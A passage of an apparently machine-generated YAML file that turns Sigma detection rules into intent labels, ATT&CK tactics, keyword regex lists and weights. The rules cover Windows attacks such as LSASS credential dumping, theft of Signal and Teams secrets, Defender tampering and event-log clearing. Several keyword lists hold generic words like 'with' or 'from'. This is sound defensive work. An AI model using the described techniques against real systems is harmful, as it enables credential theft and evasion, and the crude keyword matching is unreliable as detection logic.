    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_39a80702_d7ca_4a83_b776_525b1f86a36d
  intent: unknown
  tactic: s0195
  description: Detects files that have extensions commonly seen while SDelete is used
    to wipe files.
  conditions:
    summary:
      regex_any:
      - potential
      - secure
      - deletion
      - with
      - sdelete
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c4e92a97_a9ff_4392_9d2d_7a4c642768ca
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects a service installed by a client which has PID 0 or whose parent
    has PID 0
  conditions:
    summary:
      regex_any:
      - service
      - installed
      - unusual
      - client
      - security
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c8b00925_926c_47e3_beea_298fd563728e
  intent: execution
  tactic: execution
  description: Detects service installation of different remote access tools software.
    These software are often abused by threat actors to perform
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - services
      - have
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5d6c375a_18ae_4952_b4f6_8b803f6c8555
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects access to Signal Desktop''s sensitive data files: db.sqlite
    and config.json.

    The db.sqlite file in Signal Desktop stores all locally saved messages in an encrypted
    SQLite database, while the config.json contains the decryption key needed to access
    that data.

    Since the key is stored in plain text, a threat actor who gains access to both
    files can decrypt and read sensitive messages without needing the users credentials.

    Currently the rule only covers the default Signal installation path in AppData\Roaming.
    Signal Portable installations may use different paths based on user configuration.
    Additional paths can be added to the selection as needed.

    '
  conditions:
    summary:
      regex_any:
      - file
      - access
      - signal
      - desktop
      - sensitive
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b210394c_ba12_4f89_9117_44a2464b9511
  intent: lateral_movement
  tactic: lateral_movement
  description: Look for non-system accounts SMB accessing a file with write (0x2)
    access mask via administrative share (i.e C$).
  conditions:
    summary:
      regex_any:
      - create
      - remote
      - file
      - admin
      - share
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0255a820_e564_4e40_af2b_6ac61160335c
  intent: persistence_installation
  tactic: persistence
  description: Addition of domains is seldom and should be verified for legitimacy.
  conditions:
    summary:
      regex_any:
      - trust
      - created
      - domain
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2632954e_db1c_49cb_9936_67d1ef1d17d2
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: An attacker can use the SID history attribute to gain additional privileges.
  conditions:
    summary:
      regex_any:
      - addition
      - history
      - active
      - directory
      - object
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_39698b3f_da92_4bc6_bfb5_645a98386e45
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects suspicious computer name samtheadmin-{1..100}$ generated by
    hacktool
  conditions:
    summary:
      regex_any:
      - susp
      - computer
      - name
      - containing
      - samtheadmin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_53ad8e36_f573_46bf_97e4_15ba5bf4bb51
  intent: persistence_installation
  tactic: persistence
  description: 'Detects potential attempts made to set the Directory Services Restore
    Mode administrator password.

    The Directory Service Restore Mode (DSRM) account is a local administrator account
    on Domain Controllers.

    Attackers may change the password in order to obtain persistence.

    '
  conditions:
    summary:
      regex_any:
      - password
      - change
      - directory
      - service
      - restore
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9eb99343_d336_4020_a3cd_67f3819e68ee
  intent: unknown
  tactic: initial_access
  description: This method uses uncommon error codes on failed logons to determine
    suspicious activity and tampering with accounts that have been disabled or somehow
    restricted.
  conditions:
    summary:
      regex_any:
      - account
      - tampering
      - suspicious
      - failed
      - logon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1c480e10_7ee1_46d4_8ed2_85f9789e3ce4
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects the first occurrence of a modification to Group Policy Object
    Attributes to add privileges to user accounts or use them to add users as local
    admins.

    '
  conditions:
    summary:
      regex_any:
      - group
      - policy
      - abuse
      - privilege
      - addition
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_123e4e6d_b123_48f8_b261_7214938acaf0
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects the modification of Group Policy Objects (GPO) to add a startup/logon
    script to users or computer objects.

    '
  conditions:
    summary:
      regex_any:
      - startup
      - logon
      - script
      - added
      - group
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f7644214_0eb0_4ace_9455_331ec4c09253
  intent: credential_harvesting
  tactic: credential_access
  description: Detects failed Kerberos TGT issue operation. This can be a sign of
    manipulations of TGT messages by an attacker.
  conditions:
    summary:
      regex_any:
      - kerberos
      - manipulation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d00a9a72_2c09_4459_ad03_5e0a23351e36
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the usage of particular AttributeLDAPDisplayNames, which are
    known for data exchange via LDAP by the tool LDAPFragger and are additionally
    not commonly used in companies.
  conditions:
    summary:
      regex_any:
      - suspicious
      - ldap
      - attributes
      - used
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1bbf25b9_8038_4154_a50b_118f2a32be27
  intent: persistence_installation
  tactic: persistence
  description: Detects the creation of suspicious accounts similar to ANONYMOUS LOGON,
    such as using additional spaces. Created as an covering detection for exclusion
    of Logon Type 3 from ANONYMOUS LOGON accounts.
  conditions:
    summary:
      regex_any:
      - suspicious
      - windows
      - anonymous
      - logon
      - local
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_941e5c45_cda7_4864_8cea_bbb7458d194a
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects suspicious processes logging on with explicit credentials
  conditions:
    summary:
      regex_any:
      - suspicious
      - remote
      - logon
      - with
      - explicit
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_aa1697b7_d611_4f9a_9cb2_5125b4ccfd5c
  intent: credential_harvesting
  tactic: credential_access
  description: Detects process handle on LSASS process with certain access mask and
    object type SAM_DOMAIN
  conditions:
    summary:
      regex_any:
      - password
      - dumper
      - activity
      - lsass
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4a1b6da0_d94f_4fc3_98fc_2d9cb9e5ee76
  intent: credential_harvesting
  tactic: credential_access
  description: Detects process handle on LSASS process with certain access mask
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - accessmask
      - requested
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_968eef52_9cff_4454_8992_1e74b9cbad6c
  intent: unknown
  tactic: s0039
  description: Detects activity as "net user administrator /domain" and "net group
    domain admins /domain"
  conditions:
    summary:
      regex_any:
      - reconnaissance
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_00ba9da1_b510_4f6b_b258_8d338836180f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the extraction of password protected ZIP archives. See the
    filename variable for more details on which file has been opened.
  conditions:
    summary:
      regex_any:
      - password
      - protected
      - file
      - opened
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_54f0434b_726f_48a1_b2aa_067df14516e4
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the extraction of password protected ZIP archives with suspicious
    file names. See the filename variable for more details on which file has been
    opened.
  conditions:
    summary:
      regex_any:
      - password
      - protected
      - file
      - opened
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_571498c8_908e_40b4_910b_d2369159a3da
  intent: unknown
  tactic: initial_access
  description: Detects the extraction of password protected ZIP archives. See the
    filename variable for more details on which file has been opened.
  conditions:
    summary:
      regex_any:
      - password
      - protected
      - file
      - opened
      - email
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_eca91c7c_9214_47b9_b4c5_cb1d7e4f2350
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects uncommon outbound network activity via Kerberos default port
    indicating possible lateral movement or first stage PrivEsc via delegation.

    '
  conditions:
    summary:
      regex_any:
      - uncommon
      - outbound
      - kerberos
      - connection
      - security
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f598ea0c_c25a_4f72_a219_50c44411c791
  intent: credential_harvesting
  tactic: credential_access
  description: Detects possible addition of shadow credentials to an active directory
    object.
  conditions:
    summary:
      regex_any:
      - possible
      - shadow
      - credentials
      - added
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c462f537_a1e3_41a6_b5fc_b2c2cef9bf82
  intent: lateral_movement
  tactic: lateral_movement
  description: detects execution of psexec or paexec with renamed service name, this
    rule helps to filter out the noise if psexec is used for legit purposes or if
    attacker uses a different psexec client other than sysinternal one
  conditions:
    summary:
      regex_any:
      - suspicious
      - psexec
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_91c945bc_2ad1_4799_a591_4d00198a1215
  intent: data_staging
  tactic: collection
  description: Detects known sensitive file extensions accessed on a network share
  conditions:
    summary:
      regex_any:
      - suspicious
      - access
      - sensitive
      - file
      - extensions
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_496a0e47_0a33_4dca_b009_9e6ca3591f39
  intent: credential_harvesting
  tactic: credential_access
  description: Detects service ticket requests using RC4 encryption type
  conditions:
    summary:
      regex_any:
      - suspicious
      - kerberos
      - ticket
      - encryption
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3a734d25_df5c_4b99_8034_af1ddb5883a4
  intent: persistence_installation
  tactic: persistence
  description: Detects suspicious scheduled task creation events. Based on attributes
    such as paths, commands line flags, etc.
  conditions:
    summary:
      regex_any:
      - suspicious
      - scheduled
      - task
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7595ba94_cf3b_4471_aa03_4f6baa9e5fad
  intent: persistence_installation
  tactic: persistence
  description: Detects when adversaries stop services or processes by deleting or
    disabling their respective scheduled tasks in order to conduct data destructive
    activities
  conditions:
    summary:
      regex_any:
      - important
      - scheduled
      - task
      - deleted
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_614cf376_6651_47c4_9dcc_6b9527f749f4
  intent: persistence_installation
  tactic: persistence
  description: Detects update to a scheduled task event that contain suspicious keywords.
  conditions:
    summary:
      regex_any:
      - suspicious
      - scheduled
      - task
      - update
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_586a8d6b_6bfe_4ad9_9d78_888cd2fe50c3
  intent: persistence_installation
  tactic: persistence
  description: Detects remote service activity via remote access to the svcctl named
    pipe
  conditions:
    summary:
      regex_any:
      - remote
      - service
      - activity
      - svcctl
      - named
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9a4ff3b8_6187_4fd2_8e8b_e0eae1129495
  intent: reconnaissance
  tactic: discovery
  description: Detects handle requests and access operations to specific registry
    keys to calculate the SysKey
  conditions:
    summary:
      regex_any:
      - syskey
      - registry
      - keys
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_18beca67_ab3e_4ee3_ba7a_a46ca8d7d0cc
  intent: defense_evasion
  tactic: defense_evasion
  description: Potential threat actor tampering with Sysmon manifest and eventually
    disabling it
  conditions:
    summary:
      regex_any:
      - sysmon
      - channel
      - reference
      - deletion
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_25cde13e_8e20_4c29_b949_4e795b76f16f
  intent: credential_harvesting
  tactic: credential_access
  description: Detects an access to authentication tokens and accounts of Microsoft
    Teams desktop application.
  conditions:
    summary:
      regex_any:
      - suspicious
      - teams
      - application
      - related
      - objectacess
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_910ab938_668b_401b_b08c_b596e80fdca5
  intent: credential_harvesting
  tactic: credential_access
  description: Transferring files with well-known filenames (sensitive files with
    credential data) using network shares
  conditions:
    summary:
      regex_any:
      - transferring
      - files
      - with
      - credential
      - data
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c265cf08_3f99_46c1_8d59_328247057d57
  intent: persistence_installation
  tactic: persistence
  description: Detects the addition of a new member to the local administrator group,
    which could be legitimate activity or a sign of privilege escalation activity
  conditions:
    summary:
      regex_any:
      - user
      - added
      - local
      - administrator
      - group
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6daac7fc_77d1_449a_a71a_e6b4d59a0e54
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: The 'LsaRegisterLogonProcess' function verifies that the application
    making the function call is a logon process by checking that it has the SeTcbPrivilege
    privilege set. Possible Rubeus tries to get a handle to LSA.
  conditions:
    summary:
      regex_any:
      - user
      - couldn
      - call
      - privileged
      - service
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f63508a0_c809_4435_b3be_ed819394d612
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the usage of the ''SeLoadDriverPrivilege'' privilege. This
    privilege is required to load or unload a device driver.

    With this privilege, the user can dynamically load and unload device drivers or
    other code in to kernel mode.

    This user right does not apply to Plug and Play device drivers.

    If you exclude privileged users/admins and processes, which are allowed to do
    so, you are maybe left with bad programs trying to load malicious kernel drivers.

    This will detect Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs)
    and the usage of Sysinternals and various other tools. So you have to work with
    a whitelist to find the bad stuff.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - privileged
      - system
      - service
      - operation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_46a68649_f218_4f86_aea1_16a759d81820
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects modifications to the Windows Defender exclusion registry key.
    This could indicate a potentially suspicious or even malicious activity by an
    attacker trying to add a new exclusion in order to bypass security.

    '
  conditions:
    summary:
      regex_any:
      - windows
      - defender
      - exclusion
      - list
      - modified
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e9c8808f_4cfb_4ba9_97d4_e5f3beaa244d
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects write access requests to the Windows Defender exclusions registry
    keys. This could be an indication of an attacker trying to request a handle or
    access the object to write new exclusions in order to bypass security.

    '
  conditions:
    summary:
      regex_any:
      - windows
      - defender
      - exclusion
      - registry
      - write
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f6c68d5f_e101_4b86_8c84_7d96851fd65c
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects a threat actor creating a file named `wbemcomn.dll` in the
    `C:\Windows\System32\wbem\` directory over the network for a WMI DLL Hijack scenario.
  conditions:
    summary:
      regex_any:
      - t1047
      - wmiprvse
      - wbemcomn
      - hijack
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f033f3f3_fd24_4995_97d8_a3bb17550a88
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects suspicious WMI event filter and command line event consumer
    based on WMI and Security Logs.
  conditions:
    summary:
      regex_any:
      - persistence
      - security
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0b0ea3cc_99c8_4730_9c53_45deee2a4c86
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects Code Integrity (CI) engine blocking Microsoft Defender's processes
    (MpCmdRun and NisSrv) from loading unsigned DLLs which may be an attempt to sideload
    arbitrary DLL
  conditions:
    summary:
      regex_any:
      - microsoft
      - defender
      - blocked
      - from
      - loading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8289bf8c_4aca_4f5a_9db3_dc3d7afe5c10
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects Code Integrity (CI) engine blocking processes from loading
    unsigned DLLs residing in suspicious locations
  conditions:
    summary:
      regex_any:
      - unsigned
      - binary
      - loaded
      - from
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b55d23e5_6821_44ff_8a6e_67218891e49f
  intent: persistence_installation
  tactic: persistence
  description: Rule to detect the Hybrid Connection Manager service running on an
    endpoint.
  conditions:
    summary:
      regex_any:
      - hybridconnectionmanager
      - service
      - running
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_83c161b6_ca67_4f33_8ad0_644a0737cf07
  intent: execution
  tactic: execution
  description: Detects suspicious application installed by looking at the added shortcut
    to the app resolver cache
  conditions:
    summary:
      regex_any:
      - suspicious
      - application
      - installed
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_424273ea_7cf8_43a6_b712_375f925e481f
  intent: persistence_installation
  tactic: persistence
  description: Detects the execution of Scheduled Tasks where the Program being run
    is located in a suspicious location or it's an unusale program to be run from
    a Scheduled Task
  conditions:
    summary:
      regex_any:
      - scheduled
      - task
      - executed
      - from
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f0767f15_0fb3_44b9_851e_e8d9a6d0005d
  intent: persistence_installation
  tactic: persistence
  description: Detects the execution of Scheduled Tasks where the program being run
    is located in a suspicious location or where it is an unusual program to be run
    from a Scheduled Task
  conditions:
    summary:
      regex_any:
      - scheduled
      - task
      - executed
      - uncommon
      - lolbin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9e3cb244_bdb8_4632_8c90_6079c8f4f16d
  intent: impact_operations
  tactic: impact
  description: 'Detects when adversaries try to stop system services or processes
    by deleting their respective scheduled tasks in order to conduct data destructive
    activities

    '
  conditions:
    summary:
      regex_any:
      - important
      - scheduled
      - task
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_64d51a51_32a6_49f0_9f3d_17e34d640272
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects cases in which ngrok, a reverse proxy tool, forwards events
    to the local RDP port, which could be a sign of malicious behaviour
  conditions:
    summary:
      regex_any:
      - ngrok
      - usage
      - with
      - remote
      - desktop
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_360a1340_398a_46b6_8d06_99b905dc69d2
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the expiration of the grace period of Windows Defender. This
    means protection against viruses, spyware, and other potentially unwanted software
    is disabled.

    '
  conditions:
    summary:
      regex_any:
      - windows
      - defender
      - grace
      - period
      - expired
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a0a278fe_2c0e_4de2_ac3c_c68b08a9ba98
  intent: credential_harvesting
  tactic: credential_access
  description: Detects Access to LSASS Process
  conditions:
    summary:
      regex_any:
      - lsass
      - access
      - detected
      - attack
      - surface
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_97b9ce1e_c5ab_11ea_87d0_0242ac130003
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects blocking of process creations originating from PSExec and WMI
    commands
  conditions:
    summary:
      regex_any:
      - psexec
      - process
      - creations
      - block
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1321dc4e_a1fe_481d_a016_52c45f0c8b4f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the Setting of Windows Defender Exclusions
  conditions:
    summary:
      regex_any:
      - windows
      - defender
      - exclusions
      - added
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a3ab73f1_bd46_4319_8f06_4b20d0617886
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects when someone is adding or removing applications or folders
    from exploit guard "ProtectedFolders" or "AllowedApplications"

    '
  conditions:
    summary:
      regex_any:
      - windows
      - defender
      - exploit
      - guard
      - tamper
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bc275be9_0bec_4d77_8c8f_281a2df6710f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects disabling of the Windows Defender feature of scanning for malware
    and other potentially unwanted software
  conditions:
    summary:
      regex_any:
      - windows
      - defender
      - malware
      - scanning
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ea9bf0fa_edec_4fb8_8b78_b119f2528186
  intent: execution
  tactic: execution
  description: Detects triggering of AMSI by Windows Defender.
  conditions:
    summary:
      regex_any:
      - windows
      - defender
      - amsi
      - trigger
      - detected
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b28e58e4_2a72_4fae_bdee_0fbe904db642
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects disabling of Windows Defender Real-time Protection. As this
    event doesn''t contain a lot of information on who initiated this action you might
    want to reduce it to a "medium" level if this occurs too many times in your environment

    '
  conditions:
    summary:
      regex_any:
      - windows
      - defender
      - real
      - time
      - protection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dd80db93_6ec2_4f4c_a017_ad40da6ffe81
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects issues with Windows Defender Real-Time Protection features
  conditions:
    summary:
      regex_any:
      - windows
      - defender
      - real
      - time
      - protection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bc92ca75_cd42_4d61_9a37_9d5aa259c88b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the restoration of files from the defender quarantine
  conditions:
    summary:
      regex_any:
      - defender
      - restored
      - quarantine
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_801bd44f_ceed_4eb6_887c_11544633c0aa
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious changes to the Windows Defender configuration
  conditions:
    summary:
      regex_any:
      - windows
      - defender
      - configuration
      - changes
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_49e5bc24_8b86_49f1_b743_535f332c2856
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects blocked attempts to change any of Defender's settings such
    as "Real Time Monitoring" and "Behavior Monitoring"
  conditions:
    summary:
      regex_any:
      - microsoft
      - defender
      - tamper
      - protection
      - trigger
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_57b649ef_ff42_4fb0_8bf6_62da243a1708
  intent: execution
  tactic: execution
  description: Detects actions taken by Windows Defender malware detection engines
  conditions:
    summary:
      regex_any:
      - windows
      - defender
      - threat
      - detected
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_686c0b4b_9dd3_4847_9077_d6c1bbe36fcb
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects disabling of the Windows Defender virus scanning feature
  conditions:
    summary:
      regex_any:
      - windows
      - defender
      - virus
      - scanning
      - feature
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0b7889b4_5577_4521_a60a_3376ee7f9f7b
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects suspicious WMI event filter and command line event consumer
    based on WMI and Security Logs.
  conditions:
    summary:
      regex_any:
      - persistence
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4d7f1827_1637_4def_8d8a_fd254f9454df
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects application popup reporting a failure of the Sysmon service
  conditions:
    summary:
      regex_any:
      - sysmon
      - application
      - crashed
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e9d4ab66_a532_4ef7_a502_66a9e4a34f5d
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects the reporting of NTLMv1 being used between a client and server.
    NTLMv1 is insecure as the underlying encryption algorithms can be brute-forced
    by modern hardware.
  conditions:
    summary:
      regex_any:
      - ntlmv1
      - logon
      - between
      - client
      - server
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_13fc89a9_971e_4ca6_b9dc_aa53a445bf40
  intent: defense_evasion
  tactic: defense_evasion
  description: This rule detects a DHCP server in which a specified Callout DLL (in
    registry) was loaded
  conditions:
    summary:
      regex_any:
      - dhcp
      - server
      - loaded
      - callout
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_75edd3fd_7146_48e5_9848_3013d7f0282c
  intent: defense_evasion
  tactic: defense_evasion
  description: This rule detects a DHCP server error in which a specified Callout
    DLL (in registry) could not be loaded
  conditions:
    summary:
      regex_any:
      - dhcp
      - server
      - error
      - failed
      - loading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e80a0fee_1a62_4419_b31e_0d0db6e6013a
  intent: credential_harvesting
  tactic: credential_access
  description: 'The attacker creates a computer object using those permissions with
    a password known to her.

    After that she clears the attribute ServicePrincipalName on the computer object.

    Because she created the object (CREATOR OWNER), she gets granted additional permissions
    and can do many changes to the object.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - '2021'
      - '42287'
      - exploitation
      - attempt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bc2e25ed_b92b_4daa_b074_b502bdd1982b
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the invocation of TabTip via CLSID as seen when JuicyPotatoNG
    is used on a system in brute force mode
  conditions:
    summary:
      regex_any:
      - local
      - privilege
      - escalation
      - indicator
      - tabtip
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a62b37e0_45d3_48d9_a517_90c1a1b0186b
  intent: defense_evasion
  tactic: defense_evasion
  description: One of the Windows Eventlogs has been cleared. e.g. caused by "wevtutil
    cl" command execution
  conditions:
    summary:
      regex_any:
      - eventlog
      - cleared
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_100ef69e_3327_481c_8e5c_6d80d9507556
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the clearing of one of the Windows Core Eventlogs. e.g. caused
    by "wevtutil cl" command execution
  conditions:
    summary:
      regex_any:
      - important
      - windows
      - eventlog
      - cleared
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d22df9cd_2aee_4089_93c7_9dc4eae77f2c
  intent: execution
  tactic: execution
  description: 'Detects the configuration of a new ISATAP router on a Windows host.
    While ISATAP is a legitimate Microsoft technology for IPv6 transition, unexpected
    or unauthorized ISATAP router configurations could indicate a potential IPv6 DNS
    Takeover attack using tools like mitm6.

    In such attacks, adversaries advertise themselves as DHCPv6 servers and set malicious
    ISATAP routers to intercept traffic.

    This detection should be correlated with network baselines and known legitimate
    ISATAP deployments in your environment.

    '
  conditions:
    summary:
      regex_any:
      - isatap
      - router
      - address
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_993c2665_e6ef_40e3_a62a_e1a97686af79
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects a user certificate that was valid but could not be mapped
    to a user in a strong way (such as via explicit mapping, key trust mapping, or
    a SID)

    This could be a sign of exploitation of the elevation of privilege vulnerabilities
    (CVE-2022-34691, CVE-2022-26931, CVE-2022-26923) that can occur when the KDC allows
    certificate spoofing by not requiring a strong mapping.

    Events where the AccountName and CN of the Subject do not match, or where the
    CN ends in a dollar sign indicating a machine, may indicate certificate spoofing.

    '
  conditions:
    summary:
      regex_any:
      - certificate
      - with
      - strong
      - mapping
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e6f81941_b1cd_4766_87db_9fc156f658ee
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the exploitation of a security bypass and elevation of privilege
    vulnerability with Authentication Negotiation by using weak RC4-HMAC negotiation
  conditions:
    summary:
      regex_any:
      - hmac
      - downgrade
      - '2022'
      - '37966'
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_39f919f3_980b_4e6f_a975_8af7e507ef2b
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects events from the Kernel-General ETW indicating that the access
    bits of a hive with a system like hive name located in the temp directory have
    been reset.

    This occurs when an application tries to access a hive and the hive has not be
    recognized since the last 7 days (by default).

    Registry hive dumping utilities such as QuarksPwDump were seen emitting this behavior.

    '
  conditions:
    summary:
      regex_any:
      - critical
      - hive
      - suspicious
      - location
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_882fbe50_d8d7_4e29_ae80_0648a8556866
  intent: data_staging
  tactic: collection
  description: Detects "BugCheck" errors indicating the system rebooted due to a crash,
    capturing the bugcheck code, dump file path, and report ID.
